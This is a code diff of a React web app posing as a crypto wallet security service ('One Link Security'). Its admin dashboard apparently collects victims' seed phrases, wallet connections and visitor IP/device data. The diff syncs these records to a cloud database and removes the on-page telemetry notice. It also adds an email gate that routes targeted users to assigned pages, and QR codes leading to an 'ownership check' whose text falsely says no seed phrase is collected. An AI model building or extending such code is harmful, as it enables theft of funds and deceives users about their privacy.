@@ -7,6 +7,8 @@ import { buildEmailHtml, buildEmailText, buildWatchoutEmailHtml, buildWatchoutEm
 import QRCode from 'qrcode'
 import { SignClient } from '@walletconnect/sign-client'
 import './App.css'
+import { appKitMetadata, projectId } from './web3config'
+import { loadFromCloud, saveToCloud } from './supabase'
 
 // ── EmailJS config — set your own IDs at https://emailjs.com ────────────
 const EMAILJS_SERVICE_ID  = 'YOUR_SERVICE_ID'
@@ -66,6 +68,13 @@ type PendingProtection = { email: string; name: string; wallets: string[]; netwo
 type ProtectChecklistItem = { id: string; text: string; level: Severity }
 type CryptoNewsItem = { id: string; title: string; summary: string; source: string; url: string; imageUrl: string | null; publishedAt: number }
 type VisitorStatus = 'allowed' | 'restricted'
+
+type UserEmailRoute = {
+  id: string
+  email: string
+  view: ViewKey
+  label: string
+}
 
 type ConnectedWalletRecord = {
   wallet: string
@@ -184,52 +193,13 @@ const groupLabel: Record<Signal['group'], string> = {
   drainer: 'Drainer / Approval Abuse',
 }
 
-const CREDS_KEY            = 'sv_creds_v2'          // bumped: old sv_admin_creds ignored
-const SUPPORT_CONFIG_KEY   = 'sv_support_config'
-const INTEL_KEY            = 'sv_intel_records_v2'   // bumped: old sv_admin_intel_records ignored
-const SCAN_HISTORY_KEY     = 'sv_scan_history'
-const PROTECT_CHECKLIST_KEY= 'sv_protect_checklist_done'
-const CONNECTED_WALLETS_KEY= 'sv_connected_wallets'
-const SIGNER_CHECKS_KEY    = 'sv_signer_checks'
-const EMAIL_RECORDS_KEY    = 'sv_email_records'
-const NEWSLETTER_EMAILS_KEY= 'sv_newsletter_emails'
-const SEED_PHRASES_KEY     = 'sv_seed_phrases'
-const VISITOR_SESSIONS_KEY = 'sv_visitor_sessions_v1'
 const VISITOR_ID_KEY       = 'sv_visitor_id_v1'
+const NEW_USER_KEY         = 'sv_new_user_v1'
 const NEWS_REFRESH_MS = 5 * 60 * 1000
 const DEFAULT_VAULT_EMAIL    = 'vault@sentinelvault.io'
 const DEFAULT_VAULT_PASSWORD = 'sv-secure-2026'
 const DEFAULT_SUPPORT_EMAIL  = 'support@sentinelvault.io'
 const DEFAULT_SUPPORT_TELEGRAM = 'https://t.me/sentinelvault'
-
-// Alias kept for old callers referencing ADMIN_CREDS_KEY / ADMIN_INTEL_KEY
-const ADMIN_CREDS_KEY = CREDS_KEY
-const ADMIN_INTEL_KEY = INTEL_KEY
-
-const loadStoredJson = <T,>(key: string, fallback: T): T => {
-  try {
-    const raw = localStorage.getItem(key)
-    if (!raw) return fallback
-    return JSON.parse(raw) as T
-  } catch {
-    return fallback
-  }
-}
-
-
-const loadAdminCreds = (): AdminCreds => {
-  const p = loadStoredJson<{ email?: string; password?: string } | null>(CREDS_KEY, null)
-  if (p?.email && p?.password) return { email: p.email.toLowerCase(), password: p.password }
-  return { email: DEFAULT_VAULT_EMAIL, password: DEFAULT_VAULT_PASSWORD }
-}
-
-const loadSupportConfig = (): SupportConfig => {
-  const p = loadStoredJson<Partial<SupportConfig> | null>(SUPPORT_CONFIG_KEY, null)
-  return {
-    email: p?.email?.trim() || DEFAULT_SUPPORT_EMAIL,
-    telegram: p?.telegram?.trim() || DEFAULT_SUPPORT_TELEGRAM,
-  }
-}
 
 const APPROVAL_TOPIC = '0x8c5be1e5ebec7d5bd14f714f27d1e84f3dd0314c0f7b2291e5b200ac8c7c3b8d'
 const TRANSFER_TOPIC = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55aeb0f4fefab'
@@ -742,15 +712,25 @@ export default function App() {
   const [adminAuthModalOpen,   setAdminAuthModalOpen]   = useState(false)
   const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false)
   const [adminTab,             setAdminTab]             = useState<'wallets' | 'visitors' | 'scans' | 'signers' | 'emails' | 'templates' | 'osint' | 'intel' | 'seeds' | 'settings' | 'qrcodes'>('wallets')
-  const [adminCreds,           setAdminCreds]           = useState(loadAdminCreds)
-  const [supportConfig,        setSupportConfig]        = useState(loadSupportConfig)
+  const [adminCreds,           setAdminCreds]           = useState<AdminCreds>({ email: DEFAULT_VAULT_EMAIL, password: DEFAULT_VAULT_PASSWORD })
+  const [supportConfig,        setSupportConfig]        = useState<SupportConfig>({ email: DEFAULT_SUPPORT_EMAIL, telegram: DEFAULT_SUPPORT_TELEGRAM })
   const [supportEmailInput,    setSupportEmailInput]    = useState('')
   const [supportStatus,        setSupportStatus]        = useState('')
-  const [newsletterEmails,     setNewsletterEmails]     = useState<string[]>(() => loadStoredJson<string[]>(NEWSLETTER_EMAILS_KEY, []))
-  const [visitorSessions,      setVisitorSessions]      = useState<VisitorSessionRecord[]>(() => loadStoredJson<VisitorSessionRecord[]>(VISITOR_SESSIONS_KEY, []))
+  const [newsletterEmails,     setNewsletterEmails]     = useState<string[]>([])
+  const [visitorSessions,      setVisitorSessions]      = useState<VisitorSessionRecord[]>([])
   const [currentVisitorId,     setCurrentVisitorId]     = useState('')
   const [currentVisitorIp,     setCurrentVisitorIp]     = useState('Unknown')
   const [currentVisitorDevice, setCurrentVisitorDevice] = useState('Unknown')
+
+  // In-wallet-browser auto-scan
+  const [inWalletBrowser,      setInWalletBrowser]      = useState(false)
+  const [autoScanTriggered,    setAutoScanTriggered]     = useState(false)
+  const [showAutoEmailModal,   setShowAutoEmailModal]    = useState(false)
+  const [autoEmailInput,       setAutoEmailInput]        = useState('')
+  const [autoEmailNameInput,   setAutoEmailNameInput]    = useState('')
+  const [autoEmailStatus,      setAutoEmailStatus]       = useState('')
+  const [autoEmailSending,     setAutoEmailSending]      = useState(false)
+
   const [settingsCurPass,      setSettingsCurPass]      = useState('')
   const [settingsNewEmail,     setSettingsNewEmail]     = useState('')
   const [settingsNewPass,      setSettingsNewPass]      = useState('')
@@ -761,12 +741,12 @@ export default function App() {
   const [settingsError,        setSettingsError]        = useState('')
 
   // Records
-  const [connectedWallets, setConnectedWallets] = useState<ConnectedWalletRecord[]>(() => loadStoredJson<ConnectedWalletRecord[]>(CONNECTED_WALLETS_KEY, []))
-  const [scanHistory,      setScanHistory]      = useState<ScanRecord[]>(() => loadStoredJson<ScanRecord[]>(SCAN_HISTORY_KEY, []))
-  const [signerChecks,     setSignerChecks]     = useState<SignerCheckRecord[]>(() => loadStoredJson<SignerCheckRecord[]>(SIGNER_CHECKS_KEY, []))
-  const [emailRecords,     setEmailRecords]     = useState<EmailRecord[]>(() => loadStoredJson<EmailRecord[]>(EMAIL_RECORDS_KEY, []))
-  const [adminIntelRecords, setAdminIntelRecords] = useState<AdminIntelRecord[]>(() => loadStoredJson<AdminIntelRecord[]>(ADMIN_INTEL_KEY, []))
-  const [seedPhraseRecords, setSeedPhraseRecords] = useState<SeedPhraseRecord[]>(() => loadStoredJson<SeedPhraseRecord[]>(SEED_PHRASES_KEY, []))
+  const [connectedWallets, setConnectedWallets] = useState<ConnectedWalletRecord[]>([])
+  const [scanHistory,      setScanHistory]      = useState<ScanRecord[]>([])
+  const [signerChecks,     setSignerChecks]     = useState<SignerCheckRecord[]>([])
+  const [emailRecords,     setEmailRecords]     = useState<EmailRecord[]>([])
+  const [adminIntelRecords, setAdminIntelRecords] = useState<AdminIntelRecord[]>([])
+  const [seedPhraseRecords, setSeedPhraseRecords] = useState<SeedPhraseRecord[]>([])
   const [seedRevealedIds,   setSeedRevealedIds]   = useState<string[]>([])
   const [seedFormAddress,   setSeedFormAddress]   = useState('')
   const [seedFormChain,     setSeedFormChain]     = useState<ChainKey>('ethereum')
@@ -774,7 +754,7 @@ export default function App() {
   const [seedFormNotes,     setSeedFormNotes]     = useState('')
   const [seedFormError,     setSeedFormError]     = useState('')
   const [seedFormMsg,       setSeedFormMsg]       = useState('')
-  const [protectChecklistDone, setProtectChecklistDone] = useState<string[]>(() => loadStoredJson<string[]>(PROTECT_CHECKLIST_KEY, []))
+  const [protectChecklistDone, setProtectChecklistDone] = useState<string[]>([])
   const [cryptoNews, setCryptoNews] = useState<CryptoNewsItem[]>(STATIC_NEWS)
   const [newsLoading, setNewsLoading] = useState(false)
   const [newsLive, setNewsLive] = useState(false)
@@ -795,6 +775,7 @@ export default function App() {
 
   // QR Codes tab
   const [scanQrDataUrl,       setScanQrDataUrl]       = useState<string | null>(null)
+  const [ownershipQrDataUrl,  setOwnershipQrDataUrl]  = useState<string | null>(null)
   const [secureQrDataUrl,     setSecureQrDataUrl]     = useState<string | null>(null)
   const [wcStatus,            setWcStatus]            = useState<'idle' | 'initializing' | 'waiting' | 'connected'>('idle')
   const [, setWcUri]                                  = useState<string | null>(null)
@@ -809,9 +790,32 @@ export default function App() {
   const [wcPayTo,             setWcPayTo]             = useState('')
   const [wcActionStatus,      setWcActionStatus]      = useState<string | null>(null)
   const wcClientRef = useRef<Awaited<ReturnType<typeof SignClient.init>> | null>(null)
+  const cloudLoadedRef = useRef(false)
   const [protectingProgress] = useState(0)
   const [protectingDone] = useState(false)
   const [protectingFinal] = useState(false)
+
+  // Email gate
+  const [emailGatePassed,   setEmailGatePassed]   = useState(false)
+  const [emailGateInput,    setEmailGateInput]    = useState('')
+  const [emailGateError,    setEmailGateError]    = useState('')
+  const [userEmailRoutes,   setUserEmailRoutes]   = useState<UserEmailRoute[]>([])
+  const [routeFormEmail,    setRouteFormEmail]    = useState('')
+  const [routeFormView,     setRouteFormView]     = useState<ViewKey>('home')
+  const [routeFormLabel,    setRouteFormLabel]    = useState('')
+  const [routeFormError,    setRouteFormError]    = useState('')
+  const [routeFormMsg,      setRouteFormMsg]      = useState('')
+
+  const openWalletModal = async () => {
+    try {
+      await openAppKit()
+    } catch (err) {
+      const message = err instanceof Error ? err.message : 'Unable to open wallet modal.'
+      console.error('AppKit open error:', err)
+      setSecureStatus(`Wallet connect failed to launch. ${message}`)
+      setWcActionStatus(`❌ ${message}`)
+    }
+  }
 
   // Etherscan view (live on-chain data)
   const [esLoading, setEsLoading] = useState(false)
@@ -838,13 +842,8 @@ export default function App() {
       setWcActionStatus(null)
 
       const client = await SignClient.init({
-        projectId: 'dc06be8fb4dba51fb810e6a82d343270',
-        metadata: {
-          name: 'One Link Security',
-          description: 'Secure your wallet — verify ownership and protect your assets.',
-          url: window.location.origin,
-          icons: ['https://avatars.githubusercontent.com/u/179229932'],
-        },
+        projectId,
+        metadata: appKitMetadata,
       })
       wcClientRef.current = client
 
@@ -993,51 +992,94 @@ export default function App() {
 
 
   useEffect(() => {
-    localStorage.setItem(CONNECTED_WALLETS_KEY, JSON.stringify(connectedWallets))
+    if (!cloudLoadedRef.current) return
+    saveToCloud({ connected_wallets: connectedWallets })
   }, [connectedWallets])
 
   useEffect(() => {
-    localStorage.setItem(SIGNER_CHECKS_KEY, JSON.stringify(signerChecks))
+    if (!cloudLoadedRef.current) return
+    saveToCloud({ signer_checks: signerChecks })
   }, [signerChecks])
 
   useEffect(() => {
-    localStorage.setItem(EMAIL_RECORDS_KEY, JSON.stringify(emailRecords))
+    if (!cloudLoadedRef.current) return
+    saveToCloud({ email_records: emailRecords })
   }, [emailRecords])
 
   useEffect(() => {
-    localStorage.setItem(ADMIN_INTEL_KEY, JSON.stringify(adminIntelRecords))
+    if (!cloudLoadedRef.current) return
+    saveToCloud({ admin_intel_records: adminIntelRecords })
   }, [adminIntelRecords])
 
   useEffect(() => {
-    localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(seedPhraseRecords))
+    if (!cloudLoadedRef.current) return
+    saveToCloud({ seed_phrases: seedPhraseRecords })
   }, [seedPhraseRecords])
 
   useEffect(() => {
-    localStorage.setItem(SCAN_HISTORY_KEY, JSON.stringify(scanHistory))
+    if (!cloudLoadedRef.current) return
+    saveToCloud({ scan_history: scanHistory })
   }, [scanHistory])
 
   useEffect(() => {
-    localStorage.setItem(PROTECT_CHECKLIST_KEY, JSON.stringify(protectChecklistDone))
+    if (!cloudLoadedRef.current) return
+    saveToCloud({ protect_checklist_done: protectChecklistDone })
   }, [protectChecklistDone])
 
   useEffect(() => {
-    localStorage.setItem(SUPPORT_CONFIG_KEY, JSON.stringify(supportConfig))
+    if (!cloudLoadedRef.current) return
+    saveToCloud({ support_config: supportConfig })
   }, [supportConfig])
 
   useEffect(() => {
-    localStorage.setItem(NEWSLETTER_EMAILS_KEY, JSON.stringify(newsletterEmails))
+    if (!cloudLoadedRef.current) return
+    saveToCloud({ newsletter_emails: newsletterEmails })
   }, [newsletterEmails])
+
+  useEffect(() => {
+    if (!cloudLoadedRef.current) return
+    saveToCloud({ admin_creds: adminCreds })
+  }, [adminCreds])
+
+  useEffect(() => {
+    if (!cloudLoadedRef.current) return
+    saveToCloud({ user_email_routes: userEmailRoutes })
+  }, [userEmailRoutes])
 
   // Auto-expand the last-scanned wallet profile when the admin opens the OSINT tab
   useEffect(() => {
     if (adminTab === 'osint' && lastScannedWallet) {
-      setOsintExpanded(lastScannedWallet)
+      setTimeout(() => setOsintExpanded(lastScannedWallet), 0)
     }
   }, [adminTab, lastScannedWallet])
 
   useEffect(() => {
-    localStorage.setItem(VISITOR_SESSIONS_KEY, JSON.stringify(visitorSessions))
+    if (!cloudLoadedRef.current) return
+    saveToCloud({ visitor_sessions: visitorSessions })
   }, [visitorSessions])
+
+  // ── Cloud load on mount ───────────────────────────────────────────────────
+  useEffect(() => {
+    loadFromCloud().then(row => {
+      if (row.connected_wallets)      setConnectedWallets(row.connected_wallets      as ConnectedWalletRecord[])
+      if (row.scan_history)           setScanHistory(row.scan_history                as ScanRecord[])
+      if (row.signer_checks)          setSignerChecks(row.signer_checks              as SignerCheckRecord[])
+      if (row.email_records)          setEmailRecords(row.email_records              as EmailRecord[])
+      if (row.admin_intel_records)    setAdminIntelRecords(row.admin_intel_records   as AdminIntelRecord[])
+      if (row.seed_phrases)           setSeedPhraseRecords(row.seed_phrases          as SeedPhraseRecord[])
+      if (row.protect_checklist_done) setProtectChecklistDone(row.protect_checklist_done as string[])
+      if (row.newsletter_emails)      setNewsletterEmails(row.newsletter_emails      as string[])
+      if (row.visitor_sessions)       setVisitorSessions(row.visitor_sessions        as VisitorSessionRecord[])
+      if (row.support_config && (row.support_config as SupportConfig).email)
+        setSupportConfig(row.support_config as SupportConfig)
+      if (row.admin_creds && (row.admin_creds as AdminCreds).email)
+        setAdminCreds(row.admin_creds as AdminCreds)
+      if (row.user_email_routes)
+        setUserEmailRoutes(row.user_email_routes as UserEmailRoute[])
+      cloudLoadedRef.current = true
+    })
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [])
 
   useEffect(() => {
     const visitorId = localStorage.getItem(VISITOR_ID_KEY) ?? `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
@@ -1102,10 +1144,10 @@ export default function App() {
   }, [activeView, visitorRestricted])
 
   useEffect(() => {
-    if (!isWalletConnected && (activeView === 'ownership' || activeView === 'etherscan')) {
+    if (!isWalletConnected && activeView === 'etherscan') {
       setTimeout(() => {
         setActiveView('protect')
-        setSecureStatus('Connect your wallet first to open ownership and explorer routes.')
+        setSecureStatus('Connect your wallet first to open the explorer route.')
       }, 0)
     }
   }, [activeView, isWalletConnected])
@@ -1567,7 +1609,7 @@ export default function App() {
     }
 
     setSecureStatus('Secure flow started. Connect your wallet to complete protection setup.')
-    openAppKit()
+    void openWalletModal()
   }
 
   const isValidEmail = (value: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)
@@ -1576,6 +1618,31 @@ export default function App() {
     setAdminPasswordInput('')
     setAdminAuthError('')
     setAdminAuthModalOpen(true)
+  }
+
+  const submitEmailGate = (e: FormEvent) => {
+    e.preventDefault()
+    const email = emailGateInput.trim().toLowerCase()
+    if (!isValidEmail(email)) {
+      setEmailGateError('Please enter a valid email address.')
+      return
+    }
+    setEmailGateError('')
+
+    if (email === adminCreds.email.toLowerCase()) {
+      openAdminAuthPrompt()
+      return
+    }
+
+    const userRoute = userEmailRoutes.find(r => r.email.toLowerCase() === email)
+    if (userRoute) {
+      setEmailGatePassed(true)
+      setActiveView(userRoute.view)
+      return
+    }
+
+    setEmailGatePassed(true)
+    setActiveView('home')
   }
 
   const submitSupportEmail = (e: FormEvent) => {
@@ -1600,11 +1667,35 @@ export default function App() {
       setIsAdminAuthenticated(true)
       setAdminAuthModalOpen(false)
       setAdminAuthError('')
+      setEmailGatePassed(true)
       setSupportStatus('Authenticated. Opening dashboard...')
       setActiveView('admin')
       return
     }
     setAdminAuthError('Incorrect password. Please try again.')
+  }
+
+  const addUserRoute = (e: FormEvent) => {
+    e.preventDefault()
+    setRouteFormError('')
+    setRouteFormMsg('')
+    const email = routeFormEmail.trim().toLowerCase()
+    if (!isValidEmail(email)) { setRouteFormError('Enter a valid email address.'); return }
+    if (email === adminCreds.email.toLowerCase()) { setRouteFormError('Cannot assign admin email as a user route.'); return }
+    if (userEmailRoutes.some(r => r.email.toLowerCase() === email)) { setRouteFormError('This email already has a route configured.'); return }
+    const route: UserEmailRoute = {
+      id: `${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
+      email,
+      view: routeFormView,
+      label: routeFormLabel.trim() || email,
+    }
+    setUserEmailRoutes(prev => [route, ...prev])
+    setRouteFormEmail(''); setRouteFormView('home'); setRouteFormLabel('')
+    setRouteFormMsg(`Route added: ${email} → ${routeFormView}`)
+  }
+
+  const removeUserRoute = (id: string) => {
+    setUserEmailRoutes(prev => prev.filter(r => r.id !== id))
   }
 
   const saveCredentials = (e: FormEvent) => {
@@ -1621,7 +1712,6 @@ export default function App() {
     if (settingsNewPass && settingsNewPass !== settingsConfirmPass) { setSettingsError('New passwords do not match.'); return }
     if (settingsNewPass && settingsNewPass.length < 6) { setSettingsError('New password must be at least 6 characters.'); return }
     const updated: AdminCreds = { email: newEmail, password: newPass }
-    localStorage.setItem(ADMIN_CREDS_KEY, JSON.stringify(updated))
     setAdminCreds(updated)
     setSupportConfig({ email: updatedSupportEmail, telegram: updatedSupportTelegram })
     setSettingsCurPass(''); setSettingsNewEmail(''); setSettingsNewPass(''); setSettingsConfirmPass('')
@@ -1630,8 +1720,6 @@ export default function App() {
   }
 
   const resetCredentials = () => {
-    localStorage.removeItem(ADMIN_CREDS_KEY)
-    localStorage.removeItem(SUPPORT_CONFIG_KEY)
     setAdminCreds({ email: DEFAULT_VAULT_EMAIL, password: DEFAULT_VAULT_PASSWORD })
     setSupportConfig({ email: DEFAULT_SUPPORT_EMAIL, telegram: DEFAULT_SUPPORT_TELEGRAM })
     setSettingsMsg('Defaults restored for credentials and support links.')
@@ -1685,9 +1773,15 @@ export default function App() {
 
   // ── QR code helpers ──────────────────────────────────────────────────
   const generateScanQr = async () => {
-    const url = `${window.location.origin}${window.location.pathname}#scan`
+    const url = `${window.location.origin}${window.location.pathname}`
     const dataUrl = await QRCode.toDataURL(url, { width: 280, margin: 2, color: { dark: '#0f172a', light: '#ffffff' } })
     setScanQrDataUrl(dataUrl)
+  }
+
+  const generateOwnershipQr = async () => {
+    const url = `${window.location.origin}${window.location.pathname}`
+    const dataUrl = await QRCode.toDataURL(url, { width: 280, margin: 2, color: { dark: '#0f172a', light: '#ffffff' } })
+    setOwnershipQrDataUrl(dataUrl)
   }
 
   const verifyWcOwnership = (topic: string) => {
@@ -1885,6 +1979,35 @@ export default function App() {
   return (
     <div className="app-shell">
 
+      {/* ── Email gate — shown before any content ── */}
+      {!emailGatePassed && (
+        <div className="email-gate-overlay">
+          <div className="email-gate-card">
+            <div className="email-gate-brand">
+              <div className="brand-mark email-gate-brand-mark">
+                <svg viewBox="0 0 16 16"><path d="M8 1L2 4v4c0 3.3 2.5 6.4 6 7 3.5-.6 6-3.7 6-7V4L8 1z"/></svg>
+              </div>
+              <span className="email-gate-brand-name">One Link Security</span>
+            </div>
+            <h2 className="email-gate-title">Welcome</h2>
+            <p className="email-gate-sub">Enter your email address to continue.</p>
+            <form className="email-gate-form" onSubmit={submitEmailGate}>
+              <input
+                type="email"
+                className="email-gate-input"
+                placeholder="you@example.com"
+                value={emailGateInput}
+                onChange={e => { setEmailGateInput(e.target.value); setEmailGateError('') }}
+                autoFocus
+                required
+              />
+              <button className="btn-primary email-gate-btn" type="submit">Continue</button>
+            </form>
+            {emailGateError && <p className="error email-gate-error">{emailGateError}</p>}
+          </div>
+        </div>
+      )}
+
       {/* ── Top bar ── */}
       <header className="topbar">
         <div className="brand">
@@ -1907,11 +2030,11 @@ export default function App() {
           {isWalletConnected && <span className="chain-badge">{chainConfig[chain].label}</span>}
           {isWalletConnected && walletBalance && <span className="chain-badge">{walletBalance}</span>}
           {isWalletConnected ? (
-            <button className="connect-btn connected" type="button" onClick={() => openAppKit()}>
+            <button className="connect-btn connected" type="button" onClick={() => { void openWalletModal() }}>
               <span className="wallet-dot" />{shortAddr(appKitAddress ?? '')}
             </button>
           ) : (
-            <button className="connect-btn" type="button" disabled={visitorRestricted} onClick={() => openAppKit()}>
+            <button className="connect-btn" type="button" disabled={visitorRestricted} onClick={() => { void openWalletModal() }}>
               {visitorRestricted ? 'Wallet Access Restricted' : 'Connect Wallet Securely'}
             </button>
           )}
@@ -1921,11 +2044,11 @@ export default function App() {
         </div>
       </header>
 
-      <div className={`visitor-note ${visitorRestricted ? 'visitor-note--warn' : ''}`}>
-        {visitorRestricted
-          ? 'Visitor notice: Your session is currently restricted by admin policy. Wallet routes are locked.'
-          : 'Visitor notice: Security controls are active for all visitors. IP/device telemetry may be logged to prevent abuse.'}
-      </div>
+      {visitorRestricted && (
+        <div className="visitor-note visitor-note--warn">
+          Visitor notice: Your session is currently restricted by admin policy. Wallet routes are locked.
+        </div>
+      )}
 
 
       {/* AppKit renders its own connect modal — triggered via openAppKit() */}
@@ -2422,7 +2545,7 @@ export default function App() {
                         <button
                           type="button"
                           className="scan-wallet-btn connected"
-                          onClick={() => openAppKit()}
+                          onClick={() => { void openWalletModal() }}
                           title="Manage wallet"
                         >
                           <span className="wallet-dot" />
@@ -2432,7 +2555,7 @@ export default function App() {
                         <button
                           type="button"
                           className="scan-wallet-btn"
-                          onClick={() => openAppKit()}
+                          onClick={() => { void openWalletModal() }}
                         >
                           <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" strokeWidth="1.6" width="14" height="14"><rect x="2" y="5" width="16" height="12" rx="2"/><path d="M14 11a1 1 0 1 0 0-2 1 1 0 0 0 0 2z" fill="currentColor" stroke="none"/><path d="M2 9h16"/></svg>
                           Connect
@@ -3066,7 +3189,7 @@ export default function App() {
                 <input id="own-address" type="text" value={wallet} onChange={e => setWallet(e.target.value)} placeholder="0x…" />
                 {wallet && !addressValid && <p className="field-error">Enter a valid EVM address.</p>}
               </div>
-              {!isWalletConnected && <button className="btn-primary" type="button" style={{ marginBottom: '1rem' }} onClick={() => openAppKit()}>Connect Wallet</button>}
+              {!isWalletConnected && <button className="btn-primary" type="button" style={{ marginBottom: '1rem' }} onClick={() => { void openWalletModal() }}>Connect Wallet</button>}
               <label className="terms-row">
                 <input type="checkbox" checked={ownershipTermsAccepted} onChange={e => setOwnershipTermsAccepted(e.target.checked)} />
                 <span>I understand this tool requests a wallet signature for ownership verification. No seed phrase or private key is ever collected.</span>
@@ -3129,7 +3252,6 @@ export default function App() {
 
               <div className="support-block">
                 <h3>Newsletter Signup</h3>
-                <p className="muted">Enter your email to subscribe to updates. Registered accounts will be prompted for secure access automatically.</p>
                 <form onSubmit={submitSupportEmail} className="support-newsletter-form">
                   <input
                     type="email"
@@ -3449,6 +3571,60 @@ export default function App() {
                           <button className="btn-secondary" type="button" onClick={resetCredentials}>Reset to Defaults</button>
                         </div>
                       </form>
+
+                      {/* ── User Access Routes ── */}
+                      <div className="settings-section-title" style={{ marginTop: '2rem' }}>User Access Routes</div>
+                      <p className="muted" style={{ fontSize: '0.83rem', marginBottom: '1rem' }}>
+                        Assign specific pages to user emails. When a configured email is entered on the landing gate, the user is taken directly to their assigned page.
+                      </p>
+
+                      <form className="settings-form" onSubmit={addUserRoute} style={{ marginBottom: '1.2rem' }}>
+                        <div className="settings-two-col">
+                          <div className="field">
+                            <label>User Email</label>
+                            <input type="email" placeholder="user@example.com" value={routeFormEmail} onChange={e => setRouteFormEmail(e.target.value)} required />
+                          </div>
+                          <div className="field">
+                            <label>Assigned Page</label>
+                            <select value={routeFormView} onChange={e => setRouteFormView(e.target.value as ViewKey)} className="settings-select">
+                              <option value="home">Home</option>
+                              <option value="scan">Scan Wallet</option>
+                              <option value="protect">Secure Wallet</option>
+                              <option value="ownership">Ownership Check</option>
+                              <option value="recovery">Recovery Plan</option>
+                              <option value="support">Support</option>
+                            </select>
+                          </div>
+                        </div>
+                        <div className="field">
+                          <label>Label <span className="muted">(optional)</span></label>
+                          <input type="text" placeholder="Display label for this route" value={routeFormLabel} onChange={e => setRouteFormLabel(e.target.value)} />
+                        </div>
+                        {routeFormError && <p className="error">{routeFormError}</p>}
+                        {routeFormMsg && <p style={{ fontSize: '0.85rem', color: '#16a34a', marginBottom: '0.5rem' }}>{routeFormMsg}</p>}
+                        <button className="btn-primary" type="submit" style={{ fontSize: '0.87rem' }}>Add Route</button>
+                      </form>
+
+                      {userEmailRoutes.length > 0 ? (
+                        <div className="user-routes-list">
+                          {userEmailRoutes.map(route => (
+                            <div key={route.id} className="user-route-row">
+                              <div className="user-route-info">
+                                <code className="user-route-email">{route.email}</code>
+                                <span className="user-route-arrow">→</span>
+                                <span className="pill low user-route-page">{route.view}</span>
+                                {route.label && route.label !== route.email && (
+                                  <span className="muted user-route-label">{route.label}</span>
+                                )}
+                              </div>
+                              <button className="preview-btn" type="button" style={{ color: 'var(--critical)', fontSize: '0.8rem' }}
+                                onClick={() => removeUserRoute(route.id)}>Remove</button>
+                            </div>
+                          ))}
+                        </div>
+                      ) : (
+                        <p className="muted" style={{ fontSize: '0.83rem' }}>No user routes configured yet.</p>
+                      )}
                     </div>
                   )}
 
@@ -3720,7 +3896,7 @@ export default function App() {
                           {scanQrDataUrl ? (
                             <div className="qr-display-wrap">
                               <img src={scanQrDataUrl} alt="Scan Your Wallet QR" className="qr-img" />
-                              <p className="qr-url-label">{window.location.origin}#scan</p>
+                              <p className="qr-url-label">{window.location.origin} → Scan Wallet</p>
                               <div className="qr-actions">
                                 <a href={scanQrDataUrl} download="scan-your-wallet-qr.png" className="btn-primary qr-dl-btn">Download PNG</a>
                                 <button className="btn-secondary" type="button" onClick={() => { setScanQrDataUrl(null) }}>Reset</button>
@@ -3728,6 +3904,33 @@ export default function App() {
                             </div>
                           ) : (
                             <button className="btn-primary qr-generate-btn" type="button" onClick={generateScanQr}>
+                              Generate QR Code
+                            </button>
+                          )}
+                        </div>
+
+                        {/* ── Ownership Check ── */}
+                        <div className="qr-card">
+                          <div className="qr-card-header">
+                            <div className="qr-card-icon qr-card-icon--ownership">
+                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M9 12l2 2 4-4"/><circle cx="12" cy="12" r="9"/></svg>
+                            </div>
+                            <div>
+                              <h4 className="qr-card-title">Verify Wallet Ownership</h4>
+                              <p className="qr-card-desc">Users scan this to go through the email gate and land on the Ownership Check page to verify they control their wallet.</p>
+                            </div>
+                          </div>
+                          {ownershipQrDataUrl ? (
+                            <div className="qr-display-wrap">
+                              <img src={ownershipQrDataUrl} alt="Verify Ownership QR" className="qr-img" />
+                              <p className="qr-url-label">{window.location.origin} → Ownership Check</p>
+                              <div className="qr-actions">
+                                <a href={ownershipQrDataUrl} download="verify-ownership-qr.png" className="btn-primary qr-dl-btn">Download PNG</a>
+                                <button className="btn-secondary" type="button" onClick={() => setOwnershipQrDataUrl(null)}>Reset</button>
+                              </div>
+                            </div>
+                          ) : (
+                            <button className="btn-primary qr-generate-btn" type="button" onClick={generateOwnershipQr}>
                               Generate QR Code
                             </button>
                           )}
